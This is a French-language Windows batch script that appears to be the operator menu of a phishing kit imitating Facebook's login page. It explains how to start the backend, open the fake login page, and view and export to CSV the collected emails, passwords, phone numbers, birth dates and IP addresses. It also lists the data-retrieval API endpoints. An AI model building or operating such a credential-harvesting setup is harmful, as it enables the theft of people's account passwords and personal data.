@echo off
chcp 65001 >nul
REM Afficher les commandes utiles et informations

cls
echo.
echo ╔══════════════════════════════════════════════════════════════════════════════════╗
echo ║                   📘 FACEBOOK LOGIN BACKEND - GUIDE RAPIDE                        ║
echo ╚══════════════════════════════════════════════════════════════════════════════════╝
echo.

echo [1] 🚀 DÉMARRER LE SERVEUR
echo     Commande: python app.py
echo     Ou double-cliquez sur: start_server.bat
echo.

echo [2] 🌐 OUVRIR LA PAGE DE CONNEXION
echo     Ouvrez dans le navigateur: index.html
echo.

echo [3] 📊 VOIR LES DONNÉES COLLECTÉES
echo     Commande: python view_data_simple.py
echo     Menu interactif pour afficher:
echo       - Utilisateurs enregistrés
echo       - Emails et mots de passe collectés
echo       - Logs de connexion
echo       - Statistiques
echo.

echo [4] 📥 EXPORTER LES DONNÉES EN CSV
echo     Dans le visualiseur (view_data_simple.py)
echo     Choisissez l'option 6
echo.

echo [5] 🔌 ENDPOINTS API DISPONIBLES
echo     GET  http://localhost:5000/api/users
echo     GET  http://localhost:5000/api/connection-data
echo     GET  http://localhost:5000/api/login-logs
echo     GET  http://localhost:5000/api/stats
echo     POST http://localhost:5000/api/signup
echo     POST http://localhost:5000/api/login
echo.

echo [6] 📁 FICHIERS IMPORTANTS
echo     app.py                  - Serveur backend
echo     index.html              - Interface utilisateur
echo     script.js               - Code JavaScript
echo     facebook.db             - Base de données
echo     view_data_simple.py     - Visualiseur de données
echo.

echo [7] ⚙️  CONFIGURATION
echo     Port du serveur: 5000
echo     Base de données: SQLite (facebook.db)
echo     Frontend: HTML5 + CSS3 + JavaScript
echo.

echo [8] 🔐 DONNÉES COLLECTÉES
echo     ✓ Emails
echo     ✓ Numéros de téléphone
echo     ✓ Mots de passe
echo     ✓ Dates de naissance
echo     ✓ Adresses IP
echo     ✓ Horodatages
echo.

echo ╔══════════════════════════════════════════════════════════════════════════════════╗
echo ║                          COMMANDES RAPIDES                                       ║
echo ╚══════════════════════════════════════════════════════════════════════════════════╝
echo.

setlocal enabledelayedexpansion
set /p choice="Choisissez une action (1-8, ou 0 pour quitter): "

if "%choice%"=="1" (
    echo.
    echo Démarrage du serveur...
    python app.py
)

if "%choice%"=="2" (
    echo.
    echo Ouverture de la page...
    start index.html
)

if "%choice%"=="3" (
    echo.
    echo Ouverture du visualiseur...
    python view_data_simple.py
)

if "%choice%"=="4" (
    echo.
    echo Exécution du visualiseur pour exporter...
    python view_data_simple.py
)

if "%choice%"=="5" (
    echo.
    echo Les endpoints sont listés ci-dessus.
    echo Vous pouvez les tester avec:
    echo   - curl (ligne de commande)
    echo   - Postman (application)
    echo   - Navigateur (pour les requêtes GET)
    echo.
    pause
)

if "%choice%"=="0" (
    echo.
    echo À bientôt!
    exit /b 0
)

echo.
pause
